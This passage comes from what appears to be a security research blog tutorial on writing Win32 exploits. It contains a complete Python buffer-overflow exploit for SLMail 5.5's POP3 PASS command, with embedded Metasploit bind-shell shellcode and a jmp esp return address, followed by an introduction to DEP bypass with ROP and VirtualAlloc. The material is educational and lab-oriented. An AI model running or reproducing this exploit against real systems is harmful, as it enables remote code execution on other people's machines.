class="wp-image-7736 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?w=630&amp;ssl=1 630w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?resize=300%2C106&amp;ssl=1 300w" data-lazy-sizes="(max-width: 630px) 100vw, 630px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?resize=630%2C223&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7736" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/b/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?fit=630%2C223&amp;ssl=1" data-orig-size="630,223" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="b" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?fit=300%2C106&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?fit=630%2C223&amp;ssl=1" loading="lazy" width="630" height="223" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?resize=630%2C223&#038;ssl=1" alt="" class="wp-image-7736" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?w=630&amp;ssl=1 630w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/b.png?resize=300%2C106&amp;ssl=1 300w" sizes="(max-width: 630px) 100vw, 630px" data-recalc-dims="1" /></noscript></figure>



<p>As we can see, if we generate the opcodes of “sub esp,240h” the opcodes generated contain bad characters (0x00). We solve this by adding to esp a negative number: “add esp,-240h”. The “h” in the operation indicates that we are adding 240 in hex, not in decimal.</p>



<p>Then we add the opcodes to the start of the shellcode and insert it in our exploit:</p>



<pre class="wp-block-code"><code>import sys
import socket

#0x7c91fcd8 : jmp esp |  {PAGE_EXECUTE_READ} &#91;ntdll.dll]
EIP = '\xd8\xfc\x91\x7c'
move_esp = \x81\xc4\xc0\xfd\xff\xff # add esp,-240h

# Metasploit meterpreter/bind_tcp LPORT=4444 LHOST=192.168.65.176
shellcode = (
\xba\xcc\x95\x04\x48\xd9\xc8\xd9\x74\x24\xf4\x5b\x31\xc9\xb1
\x4c\x83\xc3\x04\x31\x53\x0f\x03\x53\xc3\x77\xf1\xb4\x33\xf5
\xfa\x44\xc3\x9a\x73\xa1\xf2\x9a\xe0\xa1\xa4\x2a\x62\xe7\x48
\xc0\x26\x1c\xdb\xa4\xee\x13\x6c\x02\xc9\x1a\x6d\x3f\x29\x3c
\xed\x42\x7e\x9e\xcc\x8c\x73\xdf\x09\xf0\x7e\x8d\xc2\x7e\x2c
\x22\x67\xca\xed\xc9\x3b\xda\x75\x2d\x8b\xdd\x54\xe0\x80\x87
\x76\x02\x45\xbc\x3e\x1c\x8a\xf9\x89\x97\x78\x75\x08\x7e\xb1
\x76\xa7\xbf\x7e\x85\xb9\xf8\xb8\x76\xcc\xf0\xbb\x0b\xd7\xc6
\xc6\xd7\x52\xdd\x60\x93\xc5\x39\x91\x70\x93\xca\x9d\x3d\xd7
\x95\x81\xc0\x34\xae\xbd\x49\xbb\x61\x34\x09\x98\xa5\x1d\xc9
\x81\xfc\xfb\xbc\xbe\x1f\xa4\x61\x1b\x6b\x48\x75\x16\x36\x04
\xba\x1b\xc9\xd4\xd4\x2c\xba\xe6\x7b\x87\x54\x4a\xf3\x01\xa2
\xad\x2e\xf5\x3c\x50\xd1\x06\x14\x96\x85\x56\x0e\x3f\xa6\x3c
\xce\xc0\x73\xa8\xc6\x67\x2c\xcf\x2a\xd7\x9c\x4f\x85\xbf\xf6
\x5f\xfa\xdf\xf8\xb5\x93\x77\x05\x36\x8d\xdb\x80\xd0\xc7\xf3
\xc4\x4b\x70\x31\x33\x44\xe7\x4a\x11\x2e\x27\xc1\xca\x66\xc0
\x9e\x02\xb0\xef\x1f\x01\x96\x67\xab\x46\x22\x99\xac\x42\xc2
\x33\x52\x07\xe9\x95\x05\xbf\xf3\xc0\x61\x60\x0b\x27\xf2\x67
\xf3\xb6\xd9\x1c\xc2\x2c\x61\x4b\x2b\xa1\x61\x8b\x7d\xab\x61
\xe3\xd9\x8f\x32\x16\x26\x1a\x27\x8b\xb3\xa5\x11\x7f\x13\xce
\x9f\xa6\x53\x51\x60\x8d\xe7\x96\x9e\x50\xef\x67\x5d\x85\x29
\x12\x88\x15\x0e\x2d\xff\x38\x27\xa4\xff\x6f\x37\xed
)
 
buffer_lenght = 6000
buffer = 'A' * 4654
buffer += EIP
buffer += move_esp
buffer += shellcode
buffer += 'C' * (buffer_lenght-len(buffer))

HOST = '127.0.0.1'
PORT = 110
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.close()
</code></pre>



<p>Then restart the process and execute the exploit. If all goes right, this is the result on the Windows box:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7737" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/10-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?fit=628%2C260&amp;ssl=1" data-orig-size="628,260" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="10" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?fit=300%2C124&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?fit=628%2C260&amp;ssl=1" loading="lazy" width="628" height="260" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?resize=628%2C260&#038;ssl=1" alt class="wp-image-7737 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?w=628&amp;ssl=1 628w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?resize=300%2C124&amp;ssl=1 300w" data-lazy-sizes="(max-width: 628px) 100vw, 628px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?resize=628%2C260&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7737" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/10-2/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?fit=628%2C260&amp;ssl=1" data-orig-size="628,260" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="10" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?fit=300%2C124&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?fit=628%2C260&amp;ssl=1" loading="lazy" width="628" height="260" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?resize=628%2C260&#038;ssl=1" alt="" class="wp-image-7737" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?w=628&amp;ssl=1 628w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/10.png?resize=300%2C124&amp;ssl=1 300w" sizes="(max-width: 628px) 100vw, 628px" data-recalc-dims="1" /></noscript></figure></div>



<p>And now that port can be used to connect a Meterpreter session from our Kali Linux:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7738" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/11-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?fit=996%2C491&amp;ssl=1" data-orig-size="996,491" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="11" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?fit=300%2C148&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?fit=996%2C491&amp;ssl=1" loading="lazy" width="996" height="491" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=996%2C491&#038;ssl=1" alt class="wp-image-7738 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?w=996&amp;ssl=1 996w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=300%2C148&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=768%2C379&amp;ssl=1 768w" data-lazy-sizes="(max-width: 996px) 100vw, 996px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=996%2C491&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7738" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/11-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?fit=996%2C491&amp;ssl=1" data-orig-size="996,491" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="11" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?fit=300%2C148&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?fit=996%2C491&amp;ssl=1" loading="lazy" width="996" height="491" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=996%2C491&#038;ssl=1" alt="" class="wp-image-7738" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?w=996&amp;ssl=1 996w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=300%2C148&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/11.png?resize=768%2C379&amp;ssl=1 768w" sizes="(max-width: 996px) 100vw, 996px" data-recalc-dims="1" /></noscript></figure>



<p>SLMail 5.5 got Pwned!!!</p>



<h2>DEP Bypass</h2>



<p>DEP stands for Data Execution Prevention and is a countermeasure that avoids code execution on the stack.</p>



<p>First we enable DEP for all programs on the Windows XP box (by default it is just enabled for essential Windows programs and processes). The box must be rebooted for the changes to take effect.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img data-attachment-id="7740" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/12-2/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?fit=468%2C654&amp;ssl=1" data-orig-size="468,654" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="12" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?fit=215%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?fit=468%2C654&amp;ssl=1" loading="lazy" width="468" height="654" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?resize=468%2C654&#038;ssl=1" alt class="wp-image-7740 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?w=468&amp;ssl=1 468w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?resize=215%2C300&amp;ssl=1 215w" data-lazy-sizes="(max-width: 468px) 100vw, 468px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?resize=468%2C654&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7740" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/12-2/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?fit=468%2C654&amp;ssl=1" data-orig-size="468,654" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="12" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?fit=215%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?fit=468%2C654&amp;ssl=1" loading="lazy" width="468" height="654" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?resize=468%2C654&#038;ssl=1" alt="" class="wp-image-7740" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?w=468&amp;ssl=1 468w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/12.png?resize=215%2C300&amp;ssl=1 215w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1" /></noscript></figure></div>



<p>Once DEP is enabled, try to run the exploit with the process slmail attached to the debugger.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7741" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/13-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?fit=869%2C698&amp;ssl=1" data-orig-size="869,698" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="13" data-image-description data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?fit=300%2C241&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?fit=869%2C698&amp;ssl=1" loading="lazy" width="869" height="698" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=869%2C698&#038;ssl=1" alt class="wp-image-7741 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?w=869&amp;ssl=1 869w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=300%2C241&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=768%2C617&amp;ssl=1 768w" data-lazy-sizes="(max-width: 869px) 100vw, 869px" data-lazy-src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=869%2C698&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7741" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/13-2/" data-orig-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?fit=869%2C698&amp;ssl=1" data-orig-size="869,698" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="13" data-image-description="" data-medium-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?fit=300%2C241&amp;ssl=1" data-large-file="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?fit=869%2C698&amp;ssl=1" loading="lazy" width="869" height="698" src="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=869%2C698&#038;ssl=1" alt="" class="wp-image-7741" srcset="https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?w=869&amp;ssl=1 869w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=300%2C241&amp;ssl=1 300w, https://i2.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/13.png?resize=768%2C617&amp;ssl=1 768w" sizes="(max-width: 869px) 100vw, 869px" data-recalc-dims="1" /></noscript></figure>



<p>As we can see, there is an access violation when executing “add ESP,-240”, just the first instruction we used in our exploit to move ESP away from the shellcode.</p>



<p>This is because DEP forbids the execution of code in the stack; right now the stack just contains pointers to instructions that are in other parts of memory where the code execution is permitted.</p>



<p>To solve this, we can use the return to libc technique; simply look in memory for pointers to instructions we want to execute followed by a RET instruction to chain all the instructions on the stack.</p>



<p>This technique is known as ROP (return-oriented programming), the set of instructions referenced by the pointers are known as ROP gadgets, and the set of pointers to instructions is the ROP chain.</p>



<p>A little bit of ROP theory:</p>



<p>EIP is the instruction pointer, and its value is the address of the following instruction being executed.</p>



<p>A RET instruction just pops the top value on the stack and loads it in EIP, then the value on the top of the stack (pointed to by ESP) will be the next instruction to call.</p>



<p>If we overwrite EIP with a pointer to RET instructions and put a set of pointers to instructions that ends with a RET on the stack, we manage to chain all those instructions to perform the actions we want (take note that instructions like “push” or “pop” modify the stack, so it needs to be set up properly).</p>



<p>Here is an example of how ROP works:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7744" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/c/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?fit=699%2C318&amp;ssl=1" data-orig-size="699,318" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="c" data-image-description data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?fit=300%2C136&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?fit=699%2C318&amp;ssl=1" loading="lazy" width="699" height="318" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?resize=699%2C318&#038;ssl=1" alt class="wp-image-7744 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?w=699&amp;ssl=1 699w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?resize=300%2C136&amp;ssl=1 300w" data-lazy-sizes="(max-width: 699px) 100vw, 699px" data-lazy-src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?resize=699%2C318&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7744" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/c/" data-orig-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?fit=699%2C318&amp;ssl=1" data-orig-size="699,318" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="c" data-image-description="" data-medium-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?fit=300%2C136&amp;ssl=1" data-large-file="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?fit=699%2C318&amp;ssl=1" loading="lazy" width="699" height="318" src="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?resize=699%2C318&#038;ssl=1" alt="" class="wp-image-7744" srcset="https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?w=699&amp;ssl=1 699w, https://i0.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/c.png?resize=300%2C136&amp;ssl=1 300w" sizes="(max-width: 699px) 100vw, 699px" data-recalc-dims="1" /></noscript></figure>



<p>We overwrite EIP with address 0x77c46027 (pop ecx, ret). Then we set up the stack to make sure the “pop ecx” instruction pops the “0xffffffff” value to ECX and the RET, and gets the pointer to the next instructions to execute.</p>



<p>This is the stack after executing those instructions:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="7746" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/d/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?fit=704%2C315&amp;ssl=1" data-orig-size="704,315" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="d" data-image-description data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?fit=300%2C134&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?fit=704%2C315&amp;ssl=1" loading="lazy" width="704" height="315" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?resize=704%2C315&#038;ssl=1" alt class="wp-image-7746 jetpack-lazy-image" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?w=704&amp;ssl=1 704w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?resize=300%2C134&amp;ssl=1 300w" data-lazy-sizes="(max-width: 704px) 100vw, 704px" data-lazy-src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?resize=704%2C315&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><noscript><img data-attachment-id="7746" data-permalink="https://research.nccgroup.com/2016/06/23/writing-exploits-for-win32-systems-from-scratch/d/" data-orig-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?fit=704%2C315&amp;ssl=1" data-orig-size="704,315" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="d" data-image-description="" data-medium-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?fit=300%2C134&amp;ssl=1" data-large-file="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?fit=704%2C315&amp;ssl=1" loading="lazy" width="704" height="315" src="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?resize=704%2C315&#038;ssl=1" alt="" class="wp-image-7746" srcset="https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?w=704&amp;ssl=1 704w, https://i1.wp.com/research.nccgroup.com/wp-content/uploads/2020/12/d.png?resize=300%2C134&amp;ssl=1 300w" sizes="(max-width: 704px) 100vw, 704px" data-recalc-dims="1" /></noscript></figure>



<p>We are ready to execute the next instruction in the chain.</p>



<p>Using ROP we can try to make an entire shellcode if we find enough gadgets to do it, but this very often is not possible. Luckily Windows offers some API calls that make our life easy. Using the API functions we can change the protection mode of a piece of memory or even allocate more memory for the process, making it executable. Once achieved, we can put our shellcode in that piece of memory and execute it.</p>



<p>There are many API functions we can use depending on Windows version, but VirtualAlloc and VirtualProtect are reliable and work in most Windows versions.</p>



<p>A description of VirtualAlloc can be found at&nbsp;<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx</a>.</p>



<p>VirtualAlloc reserves or commits a region of pages in the virtual address space of the calling process.</p>



